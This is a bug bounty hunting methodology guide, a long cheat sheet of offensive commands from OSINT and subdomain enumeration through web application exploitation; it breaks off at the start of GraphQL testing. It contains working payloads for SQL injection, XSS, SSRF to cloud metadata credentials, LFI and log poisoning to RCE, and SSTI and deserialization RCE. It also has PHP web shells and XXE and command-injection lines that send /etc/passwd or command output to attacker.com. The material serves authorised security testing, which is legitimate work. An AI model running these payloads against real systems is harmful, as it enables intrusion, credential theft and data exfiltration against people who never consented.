# Bug Bounty Hunting Guide
### Advanced Methodology, Commands & Techniques

## PHASE 1: RECONNAISSANCE & OSINT

## 1.1 Passive Reconnaissance

### Company Information Gathering

```bash
# WHOIS Lookup
whois target.com
whois -h whois.arin.net target.com

# Reverse WHOIS (find related domains)
amass intel -d target.com -whois

# Historical WHOIS data
curl "<https://api.whoisfreaks.com/v1.0/whois?apiKey=API_KEY&whois=historical&domainName=target.com>"

# DNS History
curl "<https://securitytrails.com/domain/target.com/dns>"

```

### Advanced OSINT Commands

```bash
# theHarvester - Comprehensive OSINT
theHarvester -d target.com -b all -l 500 -f output

# Specific sources
theHarvester -d target.com -b google,bing,linkedin,twitter,github,hunter -l 1000

# Spiderfoot automation
spiderfoot -s target.com -o output.html -m all

# Recon-ng framework
recon-ng
> marketplace install all
> workspaces create target
> db insert domains target.com
> modules load recon/domains-hosts/google_site_web
> run

```

### Email Harvesting

```bash
# Hunter.io API
curl "<https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_API_KEY>"

# EmailFinder
emailfinder -d target.com

# Phonebook.cz
curl "<https://phonebook.cz/api/v1/search?k=API_KEY&query=target.com&type=email>"

# Clearbit Connect
curl "<https://person.clearbit.com/v2/combined/find?domain=target.com>" -H "Authorization: Bearer API_KEY"

# h8mail - Email breach search
h8mail -t victim@target.com -bc api_keys.json

# CrossLinked - LinkedIn email generation
crosslinked -f '{first}.{last}@target.com' "Target Company"

```

### GitHub Dorking

```bash
# Manual GitHub Dorks
"target.com" password
"target.com" secret
"target.com" api_key
"target.com" apikey
"target.com" credentials
org:targetorg filename:config
org:targetorg extension:env
org:targetorg extension:pem
org:targetorg extension:ppk
org:targetorg AWS_ACCESS_KEY
org:targetorg AWS_SECRET_KEY
org:targetorg jdbc:
org:targetorg BEGIN RSA PRIVATE KEY
org:targetorg authorization: Bearer

# Automated GitHub Recon
# TruffleHog - Secret scanning
trufflehog github --org=targetorg --token=GITHUB_TOKEN
trufflehog git <https://github.com/target/repo.git>

# GitDorker
python3 GitDorker.py -tf GITHUB_TOKEN -q target.com -d dorks/alldorks.txt

# Gitleaks
gitleaks detect --source=/path/to/repo --report-format=json --report-path=leaks.json

# git-secrets
git secrets --scan -r /path/to/repo

# GitHub Search API
curl -H "Authorization: token GITHUB_TOKEN" \\
  "<https://api.github.com/search/code?q=target.com+password+in:file>"

```

### Google Dorking (Advanced)

```bash
# Comprehensive Google Dorks
site:target.com filetype:pdf
site:target.com filetype:xlsx
site:target.com filetype:sql
site:target.com filetype:log
site:target.com filetype:env
site:target.com filetype:config
site:target.com intitle:"index of"
site:target.com inurl:admin
site:target.com inurl:login
site:target.com inurl:portal
site:target.com inurl:api
site:target.com ext:php inurl:?
site:target.com ext:aspx inurl:?
site:target.com "mysql_connect"
site:target.com "password" filetype:log
site:target.com "error" | "warning" | "exception"
site:*.target.com -www
site:target.com inurl:upload
site:target.com inurl:redirect
site:target.com inurl:callback
site:target.com inurl:oauth
site:target.com inurl:token

# Finding subdomains
site:*.target.com
site:*.*.target.com

# Finding login pages
site:target.com inurl:signin | inurl:login | inurl:auth

# Finding sensitive files
site:target.com ext:bak | ext:backup | ext:old
site:target.com ext:sql | ext:db | ext:mdb
site:target.com ext:conf | ext:config | ext:ini

# Cloud storage dorks
site:s3.amazonaws.com "target"
site:blob.core.windows.net "target"
site:storage.googleapis.com "target"
site:digitaloceanspaces.com "target"

# Automated Google Dorking
# GooFuzz
goofuzz -t target.com -e pdf,xlsx,doc,docx,sql,log -o output

# Pagodo
python3 pagodo.py -d target.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1

```

### Social Media OSINT

```bash
# Sherlock - Username hunting
sherlock username

# Social-Analyzer
python3 social-analyzer --username "target" --websites "all"

# Twint - Twitter Intelligence
twint -u target_user --since 2024-01-01 -o output.json --json
twint -s "target.com" --since 2024-01-01

# LinkedIn Reconnaissance
# LinkedInt
python3 linkedint.py -e target.com

# Instagram OSINT
python3 osintgram.py target_user

# Holehe - Email social media check
holehe email@target.com

```

---

# PHASE 2: SUBDOMAIN ENUMERATION

## 2.1 Passive Subdomain Enumeration

```bash
# Subfinder (comprehensive passive)
subfinder -d target.com -all -recursive -o subs.txt
subfinder -d target.com -sources crtsh,virustotal,shodan,github -o subs.txt

# Amass Passive Mode
amass enum -passive -d target.com -o amass_passive.txt
amass enum -passive -d target.com -config config.ini -o subs.txt

# Chaos Project Data
chaos -d target.com -o chaos_subs.txt

# Certificate Transparency Logs
curl -s "<https://crt.sh/?q=%25.target.com&output=json>" | jq -r '.[].name_value' | sort -u

# Using multiple CT sources
ctfr -d target.com -o ctfr_subs.txt

# SecurityTrails API
curl "<https://api.securitytrails.com/v1/domain/target.com/subdomains>" \\
  -H "apikey: YOUR_API_KEY" | jq -r '.subdomains[]' | sed 's/$/.target.com/'

# Shodan Subdomains
shodan search ssl.cert.subject.cn:target.com --fields hostnames | tr ',' '\\n' | sort -u

# VirusTotal API
curl "<https://www.virustotal.com/vtapi/v2/domain/report?apikey=API_KEY&domain=target.com>" | jq -r '.subdomains[]'

# Censys Certificates
curl "<https://search.censys.io/api/v2/certificates/search>" \\
  -H "Authorization: Basic BASE64_API" \\
  -H "Content-Type: application/json" \\
  -d '{"q":"names: *.target.com","per_page":100}'

# AlienVault OTX
curl "<https://otx.alienvault.com/api/v1/indicators/domain/target.com/passive_dns>" | jq -r '.passive_dns[].hostname'

# Rapid7 FDNS
cat fdns_a.json.gz | pigz -dc | grep "target.com" | jq -r '.name'

# Wayback Machine subdomains
curl -s "<http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey>" | sed -e 's_https*://__' -e 's_/.*__' | sort -u

# Common Crawl
curl -s "<http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.target.com&output=json>" | jq -r '.url' | sed 's_https*://__' | cut -d/ -f1 | sort -u

```

## 2.2 Active Subdomain Enumeration

```bash
# Amass Active Mode
amass enum -active -d target.com -brute -w wordlist.txt -o amass_active.txt
amass enum -active -d target.com -rf resolvers.txt -nf known_subs.txt

# DNS Brute Forcing
# puredns - Fast DNS brute forcing
puredns bruteforce wordlist.txt target.com -r resolvers.txt -w bruteforce_subs.txt
puredns resolve subs.txt -r resolvers.txt -w resolved.txt

# Shuffledns
shuffledns -d target.com -w wordlist.txt -r resolvers.txt -o shuffledns_subs.txt

# DNSX - DNS toolkit
cat subs.txt | dnsx -silent -a -resp -o dnsx_results.txt
dnsx -l subs.txt -resp -a -aaaa -cname -mx -ns -txt -ptr -o dns_records.txt

# Massdns
massdns -r resolvers.txt -t A -o S -w massdns_output.txt subs.txt

# Aiodnsbrute
aiodnsbrute -w wordlist.txt -vv -t 1000 target.com

# DNS Zone Transfer attempt
dig axfr @ns1.target.com target.com
host -t axfr target.com ns1.target.com

# DNSSEC Zone Walking
ldns-walk target.com
dnsrecon -d target.com -t zonewalk

# dnsgen - Generate permutations
cat subs.txt | dnsgen - | puredns resolve -r resolvers.txt

# altdns - Subdomain permutations
altdns -i subs.txt -o permutations.txt -w words.txt
cat permutations.txt | puredns resolve -r resolvers.txt

# gotator - Advanced permutations
gotator -sub subs.txt -perm permutations.txt -depth 2 -numbers 5 | puredns resolve

```

## 2.3 Subdomain Takeover Detection

```bash
# Subjack
subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v -o takeovers.txt

# Nuclei subdomain takeover
nuclei -l live_subs.txt -t ~/nuclei-templates/takeovers/ -o takeover_results.txt

# Can-I-Take-Over-XYZ (Manual Check)
# Reference: <https://github.com/EdOverflow/can-i-take-over-xyz>

# Subzy
subzy run --targets subs.txt --concurrency 100 --hide_fails

# Second-Order Subdomain Takeover
# Check CNAME records pointing to deprovisioned services
cat subs.txt | dnsx -cname -resp | grep -E "(s3|azure|heroku|github|shopify|fastly)" > potential_takeovers.txt

# Dnsreaper
dnsreaper file --filename subs.txt

```

## 2.4 Combining & Deduplicating Results

```bash
# Combine all subdomain sources
cat subfinder.txt amass.txt chaos.txt ctfr.txt | sort -u > all_subs.txt

# Resolve all subdomains
puredns resolve all_subs.txt -r resolvers.txt -w resolved_subs.txt

# Get live hosts with httpx
cat resolved_subs.txt | httpx -silent -title -tech-detect -status-code -follow-redirects -o live_hosts.txt

# Advanced httpx scanning
cat resolved_subs.txt | httpx -silent -title -status-code -content-length -web-server -tech-detect -ip -cname -cdn -follow-redirects -json -o httpx_full.json

```

---

# PHASE 3: PORT SCANNING & SERVICE DISCOVERY

## 3.1 Port Scanning

```bash
# Naabu - Fast port scanning
naabu -host target.com -p - -silent -o ports.txt
naabu -l subs.txt -p 80,443,8080,8443,8000,3000,5000 -silent -o web_ports.txt
naabu -l subs.txt -top-ports 1000 -silent -o top_ports.txt

# Masscan - Internet-scale scanning
masscan -p1-65535 --rate=10000 -iL ips.txt -oG masscan_output.txt
masscan -p80,443,8080,8443 --rate=100000 10.0.0.0/8 -oJ masscan.json

# RustScan - Fast Nmap alternative
rustscan -a target.com --ulimit 5000 -- -sV -sC -oA rustscan_output
rustscan -a target.com -p 1-65535 --ulimit 5000

# Nmap - Comprehensive scanning
# Full port scan
nmap -p- -T4 --min-rate=1000 -sV -sC -oA full_scan target.com

# Service version detection
nmap -sV -sC -p 80,443,8080,8443 -oA service_scan target.com

# UDP scanning
nmap -sU -top-ports 100 --min-rate=1000 target.com

# Vulnerability scanning
nmap --script vuln -p 80,443 target.com

# Advanced Nmap scripts
nmap --script=http-enum,http-vuln*,http-sql-injection -p 80,443 target.com
nmap --script=ssl-enum-ciphers -p 443 target.com

# Scan specific services
nmap -sV --script=mysql* -p 3306 target.com
nmap -sV --script=mongodb* -p 27017 target.com
nmap -sV --script=redis* -p 6379 target.com

```

## 3.2 Service Identification

```bash
# Banner Grabbing
echo "" | nc -v -n -w1 target.com 80
curl -I <http://target.com>
curl -I <https://target.com>

# SSL/TLS Analysis
sslscan target.com:443
sslyze --regular target.com:443
testssl.sh target.com:443

# Specific service enumeration
# SSH
ssh-audit target.com

# SMB
smbclient -L //target.com -N
enum4linux -a target.com
crackmapexec smb target.com

# LDAP
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com"

# RPC
rpcclient -U "" -N target.com

# SNMP
snmpwalk -v2c -c public target.com
onesixtyone -c community.txt target.com

```

---

# PHASE 4: CONTENT DISCOVERY

## 4.1 Directory & File Bruteforcing

```bash
# Feroxbuster - Fast directory bruteforcing
feroxbuster -u <https://target.com> -w /path/to/wordlist.txt -t 100 -x php,asp,aspx,jsp,html,js -o ferox_output.txt
feroxbuster -u <https://target.com> -w wordlist.txt --depth 3 --filter-status 404,403 --extract-links

# ffuf - Fuzzing tool
ffuf -u <https://target.com/FUZZ> -w wordlist.txt -t 100 -mc all -fc 404 -o ffuf_output.json -of json
ffuf -u <https://target.com/FUZZ> -w wordlist.txt -e .php,.asp,.aspx,.jsp,.html,.js,.txt,.bak -mc 200,301,302,403 -recursion -recursion-depth 2

# Advanced ffuf with multiple wordlists
ffuf -u <https://target.com/FUZZ> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt:FUZZ2 -mode clusterbomb

# Gobuster
gobuster dir -u <https://target.com> -w wordlist.txt -t 50 -x php,asp,aspx,jsp -o gobuster_output.txt
gobuster dir -u <https://target.com> -w wordlist.txt -b 404,403 --wildcard

# Dirsearch
dirsearch -u <https://target.com> -e php,asp,aspx,jsp,html,js -t 50 --exclude-status 404,403

# Recursebuster
recursebuster -u <https://target.com> -w wordlist.txt -t 100

# Katana - Crawling and content discovery
katana -u <https://target.com> -d 5 -jc -kf -ef css,png,jpg,gif,svg -o katana_output.txt
katana -list urls.txt -d 3 -jc -kf -aff -xhr -o crawl_results.txt

```

## 4.2 Parameter Discovery

```bash
# Arjun - Parameter finder
arjun -u <https://target.com/endpoint> -m GET -o arjun_params.json
arjun -u <https://target.com/endpoint> -m POST --stable
arjun -i urls.txt -m GET -oT arjun_results.txt

# ParamSpider
paramspider -d target.com -o paramspider_output.txt
paramspider -d target.com --exclude woff,css,js,png,svg,jpg

# x8 - Hidden parameter discovery
x8 -u "<https://target.com/endpoint>" -w params.txt -o x8_output.txt

# GAU + parameter extraction
gau target.com | unfurl -u keys | sort -u > params.txt

# Extracting parameters from JavaScript
cat js_files.txt | xargs -I{} curl -s {} | grep -oE "[a-zA-Z0-9_]+\\s*[:=]" | sort -u

# ffuf parameter fuzzing
ffuf -u "<https://target.com/endpoint?FUZZ=test>" -w params.txt -mc all -fc 404

```

## 4.3 JavaScript Analysis

```bash
# getJS - JavaScript extraction
getJS --url <https://target.com> --complete --output js_files.txt

# subjs - Find JS files from subdomains
cat subs.txt | subjs | sort -u > all_js.txt

# LinkFinder - Extract endpoints from JS
python3 linkfinder.py -i <https://target.com/script.js> -o cli
python3 linkfinder.py -i <https://target.com> -d -o results.html

# SecretFinder - Find secrets in JS
python3 SecretFinder.py -i <https://target.com/script.js> -o cli
python3 SecretFinder.py -i js_files.txt -o results.html

# JSParser
python3 JSParser.py -u <https://target.com>

# Retire.js - Vulnerable JS libraries
retire --js --jspath /path/to/js/files
retire --js --jsuri <https://target.com/script.js>

# Nuclei for JS analysis
nuclei -l js_files.txt -t ~/nuclei-templates/exposures/ -o js_exposures.txt

# JSFScan.sh - Complete JS analysis
./JSFScan.sh -u <https://target.com>

# Mantra - Hunt down API keys
cat js_files.txt | xargs -I{} python3 mantra.py -u {}

# Custom regex for secrets
cat script.js | grep -oE "(api[_-]?key|apikey|secret|password|token|auth)['\\"]?\\s*[:=]\\s*['\\"][a-zA-Z0-9]+"

# Trufflehog for JS
trufflehog filesystem --directory ./js_files/

```

## 4.4 Wayback Machine Mining

```bash
# Waybackurls
waybackurls target.com > wayback_urls.txt

# GAU (GetAllUrls)
gau target.com --blacklist png,jpg,gif,css,woff,svg --o gau_output.txt
gau target.com --providers wayback,commoncrawl,otx,urlscan --o all_urls.txt

# Gauplus
gauplus -t 5 -random-agent -subs target.com -o gauplus_urls.txt

# Waymore - Extended wayback mining
waymore -i target.com -mode U -oU waymore_urls.txt
waymore -i target.com -mode R -oR responses/

# Common Crawl
python3 cc.py -d target.com -o commoncrawl_urls.txt

# Filter interesting endpoints
cat all_urls.txt | grep -E "\\?" | sort -u > params_urls.txt
cat all_urls.txt | grep -E "\\.js(\\?|$)" | sort -u > js_urls.txt
cat all_urls.txt | grep -E "\\.(php|asp|aspx|jsp)\\?" | sort -u > dynamic_urls.txt
cat all_urls.txt | grep -E "(api|graphql|rest|v1|v2)" | sort -u > api_urls.txt

# uro - URL deduplication
cat all_urls.txt | uro > unique_urls.txt

# URO with filters
cat all_urls.txt | uro -b jpg,png,gif,css,js,woff,svg | sort -u > clean_urls.txt

```

---

# PHASE 5: TECHNOLOGY FINGERPRINTING

## 5.1 Technology Detection

```bash
# Wappalyzer CLI
wappalyzer <https://target.com>

# WhatWeb
whatweb <https://target.com> -v -a 3

# Webanalyze (Wappalyzer alternative)
webanalyze -host <https://target.com> -crawl 2

# BuiltWith CLI
curl "<https://api.builtwith.com/free1/api.json?KEY=API_KEY&LOOKUP=target.com>"

# Httpx technology detection
cat subs.txt | httpx -tech-detect -json -o tech_results.json

# Nuclei technology detection
nuclei -l urls.txt -t ~/nuclei-templates/technologies/ -o technologies.txt

# CMS Detection
# CMSeek
cmseek -u <https://target.com>

# WPScan (WordPress)
wpscan --url <https://target.com> --enumerate ap,at,cb,dbe --api-token TOKEN

# Droopescan (Drupal, Joomla, SilverStripe)
droopescan scan drupal -u <https://target.com>
droopescan scan joomla -u <https://target.com>

# Joomscan
joomscan -u <https://target.com>

# BlindElephant
python BlindElephant.py <https://target.com> guess

```

## 5.2 Framework & Version Detection

```bash
# Nuclei for version detection
nuclei -l urls.txt -t ~/nuclei-templates/technologies/ -t ~/nuclei-templates/exposed-panels/ -o versions.txt

# Fingerprinting with curl
curl -I <https://target.com> | grep -iE "(server|x-powered-by|x-aspnet-version)"

# Favicon hash analysis
curl <https://target.com/favicon.ico> | md5sum
# Then search in Shodan: http.favicon.hash:HASH_VALUE

# HTTP headers analysis
curl -s -D - <https://target.com> -o /dev/null | grep -iE "server|x-powered|x-generator|x-drupal|x-magento"

# Error page analysis
curl -s "<https://target.com/nonexistent.php>" | head -50
curl -s "<https://target.com/nonexistent.aspx>" | head -50

```

---

# PHASE 6: VULNERABILITY SCANNING

## 6.1 Automated Vulnerability Scanning

```bash
# Nuclei - Comprehensive scanning
nuclei -l urls.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei_results.txt
nuclei -l urls.txt -t ~/nuclei-templates/cves/ -o cve_results.txt
nuclei -l urls.txt -t ~/nuclei-templates/vulnerabilities/ -o vuln_results.txt
nuclei -l urls.txt -t ~/nuclei-templates/exposures/ -o exposure_results.txt

# Nuclei with custom config
nuclei -l urls.txt -t ~/nuclei-templates/ -config nuclei-config.yaml -rate-limit 150 -bulk-size 100 -concurrency 50

# Nuclei headless mode
nuclei -l urls.txt -t ~/nuclei-templates/ -headless -timeout 10

# Nikto
nikto -h <https://target.com> -output nikto_results.txt -Format txt
nikto -h <https://target.com> -Tuning x -Plugins all

# OWASP ZAP Automation
# Start ZAP in daemon mode
zap.sh -daemon -port 8080 -config api.key=YOUR_API_KEY

# ZAP API scanning
curl "<http://localhost:8080/JSON/spider/action/scan/?apikey=KEY&url=https://target.com>"
curl "<http://localhost:8080/JSON/ascan/action/scan/?apikey=KEY&url=https://target.com>"

# ZAP CLI
zap-cli quick-scan -s all -r <https://target.com>

# Burp Suite Pro Automation (using Burp API)
burp_suite_pro --config-file config.json --unpause-spider-and-scanner

# Jaeles
jaeles scan -s signatures/ -U urls.txt -o jaeles_output

# Osmedeus
osmedeus scan -f urls.txt -m intensive

```

## 6.2 CVE Detection

```bash
# Nuclei CVE scanning
nuclei -l urls.txt -t ~/nuclei-templates/cves/2024/ -o cve_2024.txt
nuclei -l urls.txt -t ~/nuclei-templates/cves/2025/ -o cve_2025.txt
nuclei -u <https://target.com> -tags cve -severity critical,high

# Searchsploit
searchsploit apache 2.4
searchsploit -x exploits/linux/webapps/12345.py

# Vulners
vulners_scanner -t target.com

# Vulscan (Nmap)
nmap -sV --script=vulscan/vulscan.nse target.com

```

---

# PHASE 7: WEB APPLICATION TESTING

## 7.1 SQL Injection (SQLi)

```bash
# SQLMap - Comprehensive testing
sqlmap -u "<https://target.com/page?id=1>" --batch --level=5 --risk=3 --dbs
sqlmap -u "<https://target.com/page?id=1>" --batch --dbs --tables --dump
sqlmap -u "<https://target.com/page?id=1>" --batch --os-shell
sqlmap -u "<https://target.com/page?id=1>" --batch --file-read="/etc/passwd"

# SQLMap with POST data
sqlmap -u "<https://target.com/login>" --data="user=admin&pass=test" --batch --dbs

# SQLMap with cookies
sqlmap -u "<https://target.com/page?id=1>" --cookie="session=xyz" --batch --dbs

# SQLMap with WAF bypass
sqlmap -u "<https://target.com/page?id=1>" --batch --tamper=space2comment,between,charencode --random-agent

# SQLMap second-order injection
sqlmap -u "<https://target.com/page?id=1>" --second-url="<https://target.com/results>" --batch

# SQLMap for different databases
sqlmap -u "<https://target.com/page?id=1>" --batch --dbms=mysql --technique=BEUSTQ

# ghauri - SQLMap alternative
ghauri -u "<https://target.com/page?id=1>" --batch --dbs

# Manual SQLi payloads
# Error-based
' OR 1=1--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--

# Time-based
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
' AND pg_sleep(5)--

# Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,database()--
' UNION SELECT 1,username,password FROM users--

# ffuf for SQLi fuzzing
ffuf -u "<https://target.com/page?id=FUZZ>" -w sqli_payloads.txt -mc all -fc 404

```

## 7.2 Cross-Site Scripting (XSS)

```bash
# Dalfox - Automated XSS scanner
dalfox url "<https://target.com/page?param=test>" -o dalfox_results.txt
dalfox file urls.txt -o dalfox_results.txt
dalfox url "<https://target.com/page?param=test>" --waf-evasion --deep-domxss

# XSStrike
python3 xsstrike.py -u "<https://target.com/page?param=test>" --crawl
python3 xsstrike.py -u "<https://target.com/page?param=test>" --blind

# kxss - Find potential XSS
cat urls.txt | kxss > potential_xss.txt

# XSS polyglots
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcLiCk=alert() )//
<svg/onload=alert('XSS')>
"><img src=x onerror=alert('XSS')>
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
'-alert(1)-'
';alert(1)//
</script><script>alert(1)</script>

# DOM XSS
<img src=1 onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">

# XSS via file upload
<svg xmlns="<http://www.w3.org/2000/svg>" onload="alert('XSS')"/>

# XSS Hunter payload
"><script src=https://yourxsshunter.xss.ht></script>

# Blind XSS payloads
"><script src=https://attacker.com/xss.js></script>
javascript:eval(atob('PAYLOAD_BASE64'))

# ffuf for XSS fuzzing
ffuf -u "<https://target.com/search?q=FUZZ>" -w xss_payloads.txt -mc all -fc 404

```

## 7.3 Server-Side Request Forgery (SSRF)

```bash
# Manual SSRF testing
curl "<https://target.com/api/fetch?url=http://127.0.0.1:80>"
curl "<https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/>"
curl "<https://target.com/api/fetch?url=http://[::1]:80>"

# SSRF payloads
<http://127.0.0.1:80>
<http://localhost:80>
http://[::]:80
<http://0.0.0.0:80>
<http://127.1:80>
<http://127.0.1:80>
<http://2130706433> (decimal IP for 127.0.0.1)
<http://0x7f000001> (hex IP for 127.0.0.1)
<http://017700000001> (octal IP)
<http://127.0.0.1.nip.io>
<http://spoofed.burpcollaborator.net>

# Cloud metadata endpoints
# AWS
<http://169.254.169.254/latest/meta-data/>
<http://169.254.169.254/latest/meta-data/iam/security-credentials/>
<http://169.254.169.254/latest/user-data/>
<http://169.254.169.254/latest/dynamic/instance-identity/document>

# GCP
<http://metadata.google.internal/computeMetadata/v1/>
<http://169.254.169.254/computeMetadata/v1/>

# Azure
<http://169.254.169.254/metadata/instance?api-version=2021-02-01>

# Digital Ocean
<http://169.254.169.254/metadata/v1/>

# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus
python3 gopherus.py --exploit mysql
python3 gopherus.py --exploit redis
python3 gopherus.py --exploit smtp

# ffuf SSRF fuzzing
ffuf -u "<https://target.com/api?url=FUZZ>" -w ssrf_payloads.txt -mc all -fc 404

```

## 7.4 Local File Inclusion (LFI) / Remote File Inclusion (RFI)

```bash
# LFI payloads
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=/etc/passwd
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id
zip://file.zip#file.txt
phar://file.phar/file.txt
file:///etc/passwd

# Windows LFI
C:\\Windows\\System32\\drivers\\etc\\hosts
..\\..\\..\\..\\windows\\system32\\config\\sam
C:/boot.ini

# LFI to RCE via log poisoning
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
/proc/self/fd/0-10

# LFI via PHP wrappers
php://filter/read=convert.base64-encode/resource=config.php
php://filter/convert.iconv.UTF-8.UTF-16/resource=config.php

# LFI Chaining for RCE
# Poison log file then include
curl -A "<?php system(\\$_GET['cmd']); ?>" <https://target.com>
curl "<https://target.com/page.php?file=/var/log/apache2/access.log&cmd=id>"

# lfi2rce tools
python3 lfimap.py -U "<https://target.com/page?file=FUZZ>"
python3 kadimus -u "<https://target.com/page?file=FUZZ>"

# ffuf LFI fuzzing
ffuf -u "<https://target.com/page?file=FUZZ>" -w lfi_payloads.txt -mc 200

```

## 7.5 Command Injection

```bash
# Command injection payloads
; id
| id
|| id
& id
&& id
`id`
$(id)
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; curl <http://attacker.com/$(whoami)>
| curl <http://attacker.com/$(hostname)>

# Blind command injection with time
; sleep 10
&& sleep 10
| timeout 10
$(sleep 10)

# Blind command injection with DNS
; nslookup $(whoami).attacker.com
| nslookup `hostname`.attacker.com
`nslookup $USER.attacker.com`

# Commix - Automated command injection
commix -u "<https://target.com/page?cmd=id>" --batch
commix -u "<https://target.com/page?cmd=test>" --os-cmd="id"
commix -u "<https://target.com/page?cmd=test>" --os-shell

# ffuf command injection fuzzing
ffuf -u "<https://target.com/page?cmd=FUZZ>" -w command_injection.txt -mc all -fc 404

```

## 7.6 XML External Entity (XXE)

```bash
# Basic XXE payload
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

# XXE to SSRF
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "<http://169.254.169.254/latest/meta-data/>">
]>
<foo>&xxe;</foo>

# Blind XXE with external DTD
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "<http://attacker.com/evil.dtd>">
  %xxe;
]>
<foo>bar</foo>

# evil.dtd on attacker server
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;

# XXE in SVG
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="<http://www.w3.org/2000/svg>">
  <text>&xxe;</text>
</svg>

# XXE in DOCX/XLSX
# Unzip, modify [Content_Types].xml, rezip

# XXEinjector
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --httpport=80 --path=/path/to/vulnerable/endpoint

```

## 7.7 Server-Side Template Injection (SSTI)

```bash
# Detection payloads
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{config}}
{{config.items()}}

# Jinja2 (Python) RCE
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[200].__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Freemarker (Java) RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}

# Thymeleaf (Java) RCE
${T(java.lang.Runtime).getRuntime().exec('id')}

# Velocity (Java)
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))

# Tplmap - Automated SSTI exploitation
tplmap -u "<https://target.com/page?name=test>"
tplmap -u "<https://target.com/page?name=test>" --os-cmd="id"
tplmap -u "<https://target.com/page?name=test>" --os-shell

# SSTImap
python3 sstimap.py -u "<https://target.com/page?name=test>"

```

## 7.8 Insecure Deserialization

```bash
# Java deserialization
# ysoserial
java -jar ysoserial.jar CommonsCollections5 "curl <http://attacker.com>" | base64
java -jar ysoserial.jar CommonsCollections7 "ping attacker.com"

# Detect Java deserialization
# Look for: rO0 (base64 encoded AC ED 00 05)
# Look for: %AC%ED%00%05 (URL encoded)

# PHP deserialization
# phpggc
./phpggc Laravel/RCE5 system 'id' -b
./phpggc Symfony/RCE4 exec 'id'

# Python pickle
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(Exploit())))

# Ruby deserialization
# Marshal.dump payloads

# .NET deserialization
# ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "calc.exe"

```

## 7.9 File Upload Vulnerabilities

```bash
# Bypassing file upload restrictions

# Extension bypass
shell.php.jpg
shell.php%00.jpg
shell.phtml
shell.php5
shell.phar
shell.PhP
shell.php.xxx

# Content-Type bypass
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Magic bytes bypass
GIF89a
<?php system($_GET['cmd']); ?>

# Double extension
shell.jpg.php
shell.php.jpg

# Null byte injection
shell.php%00.jpg

# Case variation
shell.PHP
shell.pHp

# SVG XSS
<?xml version="1.0" standalone="no"?>
<svg xmlns="<http://www.w3.org/2000/svg>" onload="alert(1)">
</svg>

# Polyglot JPEG/PHP
# Create with: exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# fuxploider - File upload scanner
python3 fuxploider.py --url <https://target.com/upload> --not-regex "error"

```

---

# PHASE 8: API SECURITY TESTING

## 8.1 API Endpoint Discovery

```bash
# Kiterunner - API endpoint discovery
kr scan <https://target.com/api> -w routes-large.kite -x 10 -j 100 -o kr_output.txt
kr brute <https://target.com/api> -w wordlist.txt -x 10

# API Fuzzing with ffuf
ffuf -u "<https://target.com/api/FUZZ>" -w api_wordlist.txt -mc 200,201,204,301,302,401,403,500 -o api_endpoints.json

# Arjun for API parameters
arjun -u "<https://target.com/api/endpoint>" -m GET,POST -oJ api_params.json

# Mitmproxy2Swagger - Generate OpenAPI spec
mitmproxy2swagger -i flow.txt -o api_spec.yaml -p <https://target.com/api>

# Swagger UI discovery
curl <https://target.com/swagger.json>
curl <https://target.com/api/swagger.json>
curl <https://target.com/v1/swagger.json>
curl <https://target.com/openapi.json>
curl <https://target.com/api-docs>
curl <https://target.com/graphql/schema>

# Postman collection discovery
curl <https://target.com/postman_collection.json>

```

## 8.2 GraphQL Testing

```bash
# GraphQL Introspection
curl -X POST <https://target.com/graphql> \\
  -H "Content-Type: application/json" \\
  -d '{"query": "{__schema{types{name,fields{name}}}}"}'

# Full introspection query
curl -X POST <https://target.com/graphql> \\
